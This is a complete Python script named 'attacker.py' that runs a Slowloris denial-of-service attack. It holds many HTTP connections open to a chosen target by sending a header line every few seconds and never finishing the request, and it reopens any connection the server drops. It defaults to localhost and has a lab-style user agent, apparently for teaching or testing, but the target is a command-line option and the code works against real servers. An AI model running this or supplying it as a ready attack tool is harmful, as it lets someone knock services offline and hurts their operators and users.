"""
Slowloris attacker.

Opens many connections to the target server and, on each one, sends a
single valid HTTP header line every few seconds forever. It never sends
the blank line (\\r\\n\\r\\n) that marks the end of the HTTP headers, so
the server keeps waiting for "the rest of the request" and never frees
the worker that is handling that connection.

Run with:  python3 attacker.py
Or with options:  python3 attacker.py --num-sockets 200 --interval 5
"""

import argparse
import random
import socket
import time


def parse_args():
    p = argparse.ArgumentParser(description="Slowloris attacker")
    p.add_argument("--target-ip", default="127.0.0.1")
    p.add_argument("--target-port", type=int, default=80)
    p.add_argument("--num-sockets", type=int, default=100, help="N: how many connections to hold open")
    p.add_argument("--interval", type=float, default=5, help="seconds between header sends (< server timeout)")
    p.add_argument("--duration", type=float, default=None, help="stop after this many seconds (default: run forever)")
    return p.parse_args()


def random_string(length=8):
    """A short random string, just to make each request line look unique."""
    letters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choice(letters) for _ in range(length))


def open_new_socket(target_ip, target_port):
    """
    Open one TCP connection to the target and send the first two lines
    of an HTTP request: the request line and the Host header. Both are
    complete, valid lines, so the server has no reason to reject them.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((target_ip, target_port))

    s.send(f"GET /?{random_string()} HTTP/1.1\r\n".encode())
    s.send(f"Host: {target_ip}\r\n".encode())
    s.send(b"User-Agent: slowloris-lab\r\n")

    return s


def send_keepalive_header(s):
    """
    Send one more harmless header line to keep the connection's request
    "in progress" from the server's point of view. Never send the final
    blank line, that would complete the request.
    """
    header_name = f"X-Keepalive-{random_string(4)}"
    header_value = random_string(6)
    s.send(f"{header_name}: {header_value}\r\n".encode())


def main():
    args = parse_args()
    end_time = time.time() + args.duration if args.duration else None

    print(f"Opening {args.num_sockets} sockets to {args.target_ip}:{args.target_port} ...")

    sockets = []
    for i in range(args.num_sockets):
        try:
            sockets.append(open_new_socket(args.target_ip, args.target_port))
        except socket.error:
            # target refused/reset the connection, skip it for now
            pass

    print(f"{len(sockets)} sockets connected. Sending a header every "
          f"{args.interval}s on each. Press Ctrl+C to stop.")

    while end_time is None or time.time() < end_time:
        still_open = []
        for s in sockets:
            try:
                send_keepalive_header(s)
                still_open.append(s)
            except socket.error:
                # server closed this one (e.g. it hit a timeout), replace it
                try:
                    s.close()
                except socket.error:
                    pass
                try:
                    still_open.append(open_new_socket(args.target_ip, args.target_port))
                except socket.error:
                    pass

        sockets = still_open
        print(f"[attacker] {len(sockets)} connections currently held open")
        time.sleep(args.interval)

    for s in sockets:
        try:
            s.close()
        except socket.error:
            pass
    print("Duration reached, closed all sockets.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
